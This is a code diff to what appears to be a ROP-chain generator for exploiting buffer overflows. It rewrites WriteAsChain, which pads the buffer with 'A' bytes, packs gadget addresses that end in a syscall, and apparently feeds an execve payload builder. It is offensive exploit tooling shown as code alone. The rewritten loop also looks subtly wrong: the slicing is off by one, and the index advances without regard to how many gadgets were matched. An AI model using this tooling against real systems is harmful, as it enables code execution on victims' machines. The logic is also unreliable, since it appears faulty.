@@ -79,16 +79,36 @@ def CreateROPChain(command, bufflength, gadgetfile, bits):
 
 def WriteAsChain(Gadgets, bufflength):
     chain = b'A' * bufflength
-    for g in Gadgets:
-        if g == SYSCALL:
-            chain += pack(PACK_TYPE, A2R(g))
+
+    finished = False
+    index = 0
+    while finished == False:
+        if type(Gadgets[index]) is bytes:
+            chain += Gadgets[index]
+            index += 1
             continue
-        if type(g) is str:
-            chain += pack(PACK_TYPE, A2R(g + " ; ret"))
-        if type(g) is bytes:
-            chain += g
-        if type(g) is int:
-            chain += pack(PACK_TYPE, g)
+        if type(Gadgets[index]) is int:
+            chain += pack(PACK_TYPE, Gadgets[index])
+            index += 1
+            continue
+        if Gadgets[index] == SYSCALL:
+            chain += pack(PACK_TYPE, A2R(SYSCALL))
+            finished = True
+            continue
+
+
+        if type(Gadgets[index]) is str:
+            found = False
+            count = 1
+            while found == False and count < 5:
+                g = " ; ".join(Gadgets[index:index+count-1])
+                if g + " ; ret" in gadgetdictionary:
+                    chain += pack(PACK_TYPE, A2R(g + " ; ret"))
+                    found = True
+                    continue
+                count += 1
+            index += 1
+
     return chain
 
 def execve(arguments, bufflength):
